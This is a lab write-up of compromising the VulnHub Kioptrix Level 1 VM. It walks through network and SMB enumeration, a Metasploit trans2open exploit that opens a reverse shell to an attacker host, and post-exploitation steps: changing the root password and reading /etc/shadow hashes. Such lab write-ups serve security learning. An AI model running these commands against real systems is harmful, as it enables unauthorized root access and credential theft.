# Kioptrix: Level 1 (#1) Writeup

**Author:** Liul Sintayehu Tebkew
**Date:** April 16, 2026
**Platform:** VulnHub
**Difficulty:** Beginner
**Objective:** Gain root access to the Kioptrix Level 1 virtual machine.

---

## Step 1: Network Discovery

The first step is to identify active devices on the local network to locate the target machine.

```bash
sudo netdiscover
```

The scan identified an active host at **192.168.1.104** with a VMware hostname, confirming it as the target virtual machine.

---

## Step 2: Service Enumeration

Once the IP address was identified, a comprehensive Nmap scan was performed to discover open ports and running services.

```bash
nmap -sC -sV 192.168.1.104 -oN kio1
```

### Key Findings

| Port | Service | Version             | Description                                     |
| ---- | ------- | ------------------- | ----------------------------------------------- |
| 22   | SSH     | OpenSSH 2.9p2       | Outdated version with potential vulnerabilities |
| 80   | HTTP    | Apache httpd 1.3.20 | Web server                                      |
| 443  | HTTPS   | Apache httpd 1.3.20 | Secure web server                               |
| 139  | SMB     | Samba smbd          | File sharing service                            |

---

## Step 3: SMB Enumeration

Since Samba was running on port 139, the next objective was to enumerate the service and identify its specific version.

### Using enum4linux

```bash
enum4linux -a 192.168.1.104
```

### Using Metasploit for Version Identification

To pinpoint the correct exploit, the Metasploit `smb_version` module was used.

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.104
run
```

**Result:** The target was confirmed to be running **Samba 2.2.1a**.

---

## Step 4: Exploitation

Samba 2.2.1a is vulnerable to a buffer overflow in the `trans2open` function. This vulnerability allows attackers to gain remote root access.

### Execution via Metasploit

```bash
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.104
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.107
run
```

After successful exploitation, a command shell session was opened with root privileges.

### Verifying Root Access

```bash
whoami
id
```

output:

```bash
root
uid=0(root) gid=0(root)
```

---

## Step 5: Post-Exploitation

After gaining root access, the final step was to verify control over the system and demonstrate persistence techniques.

### Password Change

The root password was changed to allow direct console login.

```bash
passwd root
```

### Hash Retrieval

The `/etc/shadow` file was accessed to retrieve password hashes for further analysis.

```bash
cat /etc/shadow | grep root
```

---

## Proof of Compromise

```bash
uname -a
```

Example output:

```bash
Linux kioptrix 2.4.x #1 SMP i686 GNU/Linux
```

---

## Vulnerability Summary

| Service | Version | Vulnerability              | Impact                 |
| ------- | ------- | -------------------------- | ---------------------- |
| Samba   | 2.2.1a  | trans2open Buffer Overflow | Remote Root Access     |


---

## Conclusion

The Kioptrix Level 1 machine was successfully compromised by exploiting an outdated Samba service. The `trans2open` vulnerability provided instant root access, demonstrating the severe risks associated with unpatched systems.

This lab highlights the critical importance of:

* Keeping services updated
* Performing regular security assessments
* Monitoring networks for known vulnerabilities
* Applying proactive defense strategies

---

## Tools Used

* Netdiscover
* Nmap
* Enum4linux
* Metasploit Framework

---

**End of Writeup**
> **Disclaimer:** This writeup is for educational purposes only. It documents my personal learning process while practicing on the Kioptrix Level 1 vulnerable machine in a controlled lab environment. Do not use these techniques on systems you do not own or have explicit permission to test.
